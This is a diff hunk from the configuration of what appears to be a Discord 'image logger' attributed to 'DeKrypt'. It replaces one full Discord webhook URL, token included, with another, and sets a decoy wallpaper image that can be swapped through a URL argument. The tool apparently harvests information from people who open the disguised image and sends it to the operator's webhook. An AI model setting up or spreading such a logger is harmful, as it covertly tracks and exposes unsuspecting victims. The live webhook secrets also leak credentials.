@@ -12,7 +12,7 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1334411974972542987/lf9ZRuvblKRgiYGPIzE7UEOsV17FTcRrbn1ORYFu_QFmqC-IxZwlB9-sbBdUweSzQVHF",
+    "webhook": "https://discord.com/api/webhooks/1334936712589213819/pFMGxXrcKFkd_74xB9hu24uuyIW75JplixpRL1r6W4OvQ39UuXLe8Y8HPIr8qZntIVW7",
     "image": "https://static.wikitide.net/windowswallpaperwiki/thumb/e/eb/Windows_Energy_Bliss.jpg/200px-Windows_Energy_Bliss.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
